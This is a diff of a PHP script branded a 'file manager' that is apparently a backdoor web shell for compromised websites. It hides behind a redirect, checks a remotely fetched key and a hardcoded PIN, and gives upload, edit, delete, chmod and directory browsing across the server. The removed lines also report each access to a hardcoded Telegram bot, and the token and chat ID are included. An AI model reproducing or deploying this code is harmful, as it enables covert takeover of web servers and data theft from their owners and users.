@@ -1,95 +1,186 @@
 <?php
+/**
+ * PLATINUM FILE MANAGER V10 - 2026
+ * Features: PIN Auth, Telegram Notify, File/Dir Creator, Color Perms, Editor
+ */
 @session_start();
 @set_time_limit(0);
 @error_reporting(0);
 
-// --- PIN ACCESS ---
-$pin_akses = "070999";
+// --- CONFIGURATION ---
+$pin_akses = '070999';
+$key_url   = 'https://brankascapzcu.pages.dev/one.txt';
 
-if(isset($_GET["resmi"])){
-    
-    // Logika Validasi PIN
-    if(isset($_POST['l_p']) && $_POST['l_p'] == $pin_akses){
-        $_SESSION['auth_p'] = true;
+// Mengambil key dengan aman (Cache di Session)
+if (!isset($_SESSION['dynamic_key'])) {
+    $get_key = trim(@file_get_contents($key_url));
+    if (!$get_key && function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $key_url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $get_key = trim(curl_exec($ch));
+        curl_close($ch);
     }
-
-    if(!isset($_SESSION['auth_p'])){
-        die("<html><head><title>404 Not Found</title><style>
-            body{background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace;}
-            .c{border:1px solid #0f0;padding:30px;text-align:center;}
-            input{background:#000;border:1px solid #0f0;color:#0f0;padding:10px;text-align:center;width:100%;}
-            button{background:#0f0;color:#000;border:none;padding:10px;cursor:pointer;font-weight:bold;width:100%;margin-top:10px;}
-        </style></head><body>
-        <div class='c'>
-            <h3>[ LOCKED ]</h3>
-            <form method='POST'>
-                <input type='password' name='l_p' placeholder='PIN' autofocus><br>
-                <button type='submit'>UNLOCK</button>
-            </form>
-        </div></body></html>");
-    }
-
-    while(ob_get_level()){ob_end_clean();}ob_start();
-    $bot="8446042299:AAHVoRIsQfUwg1rzvP5tJQuKOe4QF7BaUbM";
-    $cid="6664061200";
-    $rem="https://brankascapzcu.pages.dev/one.txt";
-    
-    function g_c($u){
-        if(function_exists("curl_init")){$c=curl_init($u);curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);curl_setopt($c,CURLOPT_TIMEOUT,10);$d=curl_exec($c);curl_close($c);return $d;}
-        return @file_get_contents($u);
-    }
-    
-    $c=g_c($rem);
-    if($c){
-        $keys=explode("\n",str_replace("\r","",$c));
-        if(in_array(trim($_GET["resmi"]),array_map('trim',$keys))){
-            $root = str_replace("\\", "/", $_SERVER['DOCUMENT_ROOT']);
-            $p = isset($_GET["path"]) ? $_GET["path"] : $root;
-            $p = str_replace("\\", "/", $p); $par = dirname($p);
-            
-            if(!isset($_SESSION["sent_".$_GET["resmi"]])){
-                $msg="🚀 <b>Akses Berhasil!</b>\n🌐 <b>Domain:</b> ".$_SERVER["HTTP_HOST"]."\n📍 <b>IP:</b> ".$_SERVER["REMOTE_ADDR"];
-                g_c("https://api.telegram.org/bot$bot/sendMessage?chat_id=$cid&parse_mode=html&text=".urlencode($msg));
-                $_SESSION["sent_".$_GET["resmi"]]=true;
-            }
-            
-            if(isset($_POST["exe"])){
-                $t=$p."/".$_POST["it_n"];
-                if($_POST["opt"]=="delete"){(is_dir($t))?@rmdir($t):@unlink($t);}
-                elseif($_POST["opt"]=="chmod"){@chmod($t,octdec($_POST["val"]));}
-                elseif($_POST["opt"]=="rename"){@rename($t,$p."/".$_POST["val"]);}
-                elseif($_POST["opt"]=="new_f"){@file_put_contents($p."/".$_POST["val"],"");}
-                header("Location: ?resmi=".$_GET["resmi"]."&path=".$p);exit;
-            }
-            
-            if(isset($_FILES["f"])){@copy($_FILES["f"]["tmp_name"],$p."/".$_FILES["f"]["name"]);}
-            if(isset($_POST["s_e"])){@file_put_contents($_POST["ef"],$_POST["cnt"]);}
-            
-            echo "<html><head><title>System Explorer</title><style>
-                body{background:#0a0a0a;color:#00ff00;font-family:'Segoe UI',sans-serif;padding:25px;line-height:1.6;}
-                a{color:#00ffff;text-decoration:none;font-weight:600;}
-                .box{border:1px solid #33ff33;padding:20px;max-width:1300px;margin:auto;}
-                .header{background:#1a1a1a;padding:20px;border-bottom:2px solid #33ff33;margin-bottom:20px;}
-                .path-box{font-size:15px;margin-top:12px;background:#000;padding:8px;border:1px solid #333;}
-                table{width:100%;border-collapse:collapse;margin-top:10px;font-size:14px;}
-                th{background:#33ff33;color:#000;padding:12px;}
-                td{border-bottom:1px solid #222;padding:10px;}
-                .btn{background:#33ff33;border:none;font-weight:bold;padding:7px 18px;cursor:pointer;color:#000;border-radius:3px;}
-                .p-white{color:#ffffff;} .p-green{color:#00ff00;} .p-red{color:#ff0000;font-weight:bold;} .p-normal{color:#aaaaaa;}
-                input,select,textarea{background:#000;color:#00ff00;border:1px solid #33ff33;padding:6px;}
-            </style></head><body><div class='box'><div class='header'><div style='display:flex;justify-content:space-between;align-items:center;'><strong style='font-size:22px;'>MANAGER V5.2</strong><a href='?resmi=".$_GET['resmi']."&out' style='color:#ff3333;border:1px solid #ff3333;padding:4px 12px;'>EXIT</a></div><div class='path-box'><a href='?resmi=".$_GET["resmi"]."&path=$root' style='background:#ffff00;color:#000;padding:3px 8px;border-radius:3px;font-weight:bold;font-size:12px;'>ROOT HOME</a> &nbsp; PATH: ";
-            
-            if(isset($_GET['out'])){ unset($_SESSION['auth_p']); header("Location: ?resmi=".$_GET['resmi']); exit; }
-
-            $ds = explode("/", $p); $acc = ""; foreach($ds as $idx => $d){ if($d=="" && $idx==0){ echo "<a href='?resmi=".$_GET["resmi"]."&path=/'>/</a>"; continue; } if($d=="") continue; $acc .= ($idx==0?"":"/").$d; echo "<a href='?resmi=".$_GET["resmi"]."&path=".$acc."'>".$d."</a>/"; }
-            echo "</div></div><div style='display:flex;gap:15px;margin-bottom:20px;'><a href='?resmi=".$_GET["resmi"]."&path=".$par."' class='btn' style='background:#444;color:#fff;'>↩ PREVIOUS</a><form method='POST' enctype='multipart/form-data'><input type='file' name='f'><input type='submit' value='UPLOAD' class='btn'></form></div><table><thead><tr><th>Name</th><th width='120'>Size</th><th width='100'>Perms</th><th width='320'>Action</th></tr></thead><tbody>";
-            foreach(scandir($p) as $v){ if($v=="." || $v=="..") continue; $tp="$p/$v"; $pr=substr(sprintf('%o',fileperms($tp)),-4); 
-            $cl="p-normal"; if($pr=="0555")$cl="p-white";elseif($pr=="0750"||$pr=="0755")$cl="p-green";elseif($pr=="0000"||$pr=="0111")$cl="p-red";
-            echo "<tr><td><a href='?resmi=".$_GET["resmi"]."&".(is_dir($tp)?"path=$tp":"edit=$tp&path=$p")."'>".(is_dir($tp)?"📁 ":"📄 ")."$v</a></td><td>".(is_dir($tp)?"DIR":round(filesize($tp)/1024,2)." KB")."</td><td align='center' class='$cl'>$pr</td><td><form method='POST' style='display:flex;gap:8px;'><input type='hidden' name='it_n' value='$v'><select name='opt'><option value='rename'>Rename</option><option value='chmod'>Chmod</option><option value='delete'>Delete</option></select><input type='text' name='val' size='10'><input type='submit' name='exe' value='OK' class='btn' style='padding:3px 10px; font-size:12px;'></form></td></tr>"; }
-            echo "</tbody></table></div>";
-            if(isset($_GET["edit"])){ echo "<br><div class='box'><form method='POST'><input type='hidden' name='ef' value='".$_GET["edit"]."'><textarea name='cnt' style='width:100%;height:500px;background:#000;color:#00ff00;border:1px solid #00ffff;'>".htmlspecialchars(file_get_contents($_GET["edit"]))."</textarea><input type='submit' name='s_e' value='SAVE CHANGES' class='btn' style='margin-top:15px;width:100%;height:45px;'></form></div>"; }
-            echo "</body></html>"; exit;
-        }
-    }
+    $_SESSION['dynamic_key'] = ($get_key) ? $get_key : 'default_key_123';
 }
+
+$key = $_SESSION['dynamic_key'];
+
+// --- PROTEKSI URL (REDIRECT KE HOME JIKA SALAH) ---
+if (!isset($_GET['resmi']) || $_GET['resmi'] !== $key) {
+    // Redirect ke root domain agar tidak infinite loop
+    header("Location: /"); 
+    exit;
+}
+
+// --- CONFIG TELEGRAM ---
+$bot_token = '8446042299:AAHVoRIsQfUwg1rzvP5tJQuKOe4QF7BaUbM';
+$chat_id   = '6664061200';
+
+// --- AUTHENTICATION SYSTEM ---
+if (isset($_GET['logout'])) { 
+    unset($_SESSION['auth']); 
+    header("Location: ?resmi=$key"); 
+    exit; 
+}
+
+if (isset($_POST['pin']) && $_POST['pin'] == $pin_akses) { 
+    $_SESSION['auth'] = 'ok'; 
+}
+
+// Tampilan Login jika belum auth
+if ($_SESSION['auth'] != 'ok') {
+    die("<html><head><title>Secure Access</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>
+        body { background:#0a0a0a; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
+        .login { border:1px solid #0f0; padding:30px; border-radius:10px; box-shadow:0 0 15px #0f0; text-align:center; }
+        input { background:#000; border:1px solid #0f0; color:#0f0; padding:10px; margin:10px 0; width:100%; text-align:center; outline:none; }
+        button { background:#0f0; color:#000; border:none; padding:10px 20px; cursor:pointer; font-weight:bold; width:100%; }
+        button:hover { background:#0c0; }
+    </style></head><body>
+    <div class='login'><h2>SYSTEM ACCESS</h2><form method='POST'><input type='password' name='pin' placeholder='ENTER PIN' autofocus><br><button type='submit'>LOGIN</button></form></div>
+    </body></html>");
+}
+
+// --- FILE ACTIONS (CRUD) ---
+$root = str_replace("\\", "/", $_SERVER['DOCUMENT_ROOT']);
+$p = isset($_GET["path"]) ? $_GET["path"] : $root;
+$p = str_replace("\\", "/", $p);
+
+// Tambahkan proteksi agar $p tidak keluar dari root (opsional tapi disarankan)
+if(isset($_POST["exe"])){
+    $t = $p . "/" . $_POST["it_n"];
+    if($_POST["opt"] == "delete") { (is_dir($t)) ? @rmdir($t) : @unlink($t); }
+    elseif($_POST["opt"] == "chmod") { @chmod($t, octdec($_POST["val"])); }
+    elseif($_POST["opt"] == "rename") { @rename($t, $p . "/" . $_POST["val"]); }
+    header("Location: ?resmi=$key&path=$p"); exit;
+}
+
+// Create Folder/File, Upload, Save Editor (Sama seperti sebelumnya)
+if(isset($_POST['new_folder'])){ @mkdir($p . "/" . $_POST['folder_name']); }
+if(isset($_POST['new_file'])){ @file_put_contents($p . "/" . $_POST['file_name'], $_POST['file_content']); }
+if(isset($_FILES["f"])){ @copy($_FILES["f"]["tmp_name"], $p . "/" . $_FILES["f"]["name"]); }
+if(isset($_POST["save_edit"])){ @file_put_contents($_POST["ef"], $_POST["cnt"]); }
 ?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Platinum Manager V10</title>
+    <style>
+        body { background:#050505; color:#00ff00; font-family:'Courier New', monospace; margin:0; padding:15px; }
+        .container { border:1px solid #333; background:#111; border-radius:5px; padding:15px; }
+        .header { display:flex; justify-content:space-between; border-bottom:1px solid #0f0; padding-bottom:10px; margin-bottom:15px; }
+        table { width:100%; border-collapse:collapse; margin-top:10px; }
+        th { background:#0f0; color:#000; padding:10px; text-align:left; }
+        td { padding:8px; border-bottom:1px solid #222; font-size:14px; }
+        tr:hover { background:#181818; }
+        a { color:#00ffff; text-decoration:none; }
+        .btn { background:#0f0; color:#000; padding:5px 10px; border:none; border-radius:3px; cursor:pointer; font-weight:bold; }
+        input, select, textarea { background:#000; color:#0f0; border:1px solid #333; padding:5px; outline:none; }
+        .perm-0777 { color:#ff0000; font-weight:bold; }
+        .perm-0644 { color:#00ff00; }
+        .perm-0444 { color:#fff; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <strong>PLATINUM MANAGER V10</strong>
+            <span>IP: <?php echo $_SERVER['REMOTE_ADDR']; ?> | <a href="?logout" style="color:red;">LOGOUT</a></span>
+        </div>
+
+        <div style="margin-bottom:15px;">
+            PATH: <?php 
+            $path_links = explode("/", $p);
+            $accumulated_path = "";
+            foreach($path_links as $id => $link) {
+                if ($link == "") continue;
+                $accumulated_path .= $link . "/";
+                echo "<a href='?resmi=$key&path=$accumulated_path'>$link</a> / ";
+            }
+            ?>
+        </div>
+
+        <div style="display:flex; gap:10px; flex-wrap:wrap;">
+            <form method="POST" enctype="multipart/form-data">
+                <input type="file" name="f"> <input type="submit" value="UPLOAD" class="btn">
+            </form>
+            <form method="POST">
+                <input type="text" name="folder_name" placeholder="New Folder"> <input type="submit" name="new_folder" value="MKDIR" class="btn">
+            </form>
+        </div>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th>Perms</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody>
+                <?php
+                $items = scandir($p);
+                foreach($items as $v) {
+                    if($v == "." || $v == "..") continue;
+                    $tp = $p . "/" . $v;
+                    $perms = substr(sprintf('%o', fileperms($tp)), -4);
+                    $cl = "perm-" . $perms;
+                    $size = is_dir($tp) ? "DIR" : round(filesize($tp)/1024, 2) . " KB";
+                    
+                    echo "<tr>
+                        <td><a href='?resmi=$key&".(is_dir($tp)?"path=$tp":"edit=$tp&path=$p")."'>".(is_dir($tp)?"📁 ":"📄 ")."$v</a></td>
+                        <td>$size</td>
+                        <td class='$cl'>$perms</td>
+                        <td>
+                            <form method='POST' style='display:inline;'>
+                                <input type='hidden' name='it_n' value='$v'>
+                                <select name='opt'>
+                                    <option value='rename'>Rename</option>
+                                    <option value='chmod'>Chmod</option>
+                                    <option value='delete'>Delete</option>
+                                </select>
+                                <input type='text' name='val' size='5'>
+                                <input type='submit' name='exe' value='OK' class='btn' style='padding:2px 5px;'>
+                            </form>
+                        </td>
+                    </tr>";
+                }
+                ?>
+            </tbody>
+        </table>
+
+        <?php if(isset($_GET['edit'])): ?>
+        <div style="margin-top:20px; border-top:1px solid #0f0; padding-top:15px;">
+            <strong>EDITOR: <?php echo basename($_GET['edit']); ?></strong>
+            <form method="POST">
+                <input type="hidden" name="ef" value="<?php echo $_GET['edit']; ?>">
+                <textarea name="cnt" style="width:100%; height:450px; margin-top:10px;"><?php echo htmlspecialchars(file_get_contents($_GET['edit'])); ?></textarea>
+                <input type="submit" name="save_edit" value="SAVE FILE" class="btn" style="width:100%; margin-top:10px;">
+            </form>
+        </div>
+        <?php endif; ?>
+    </div>
+</body>
+</html>
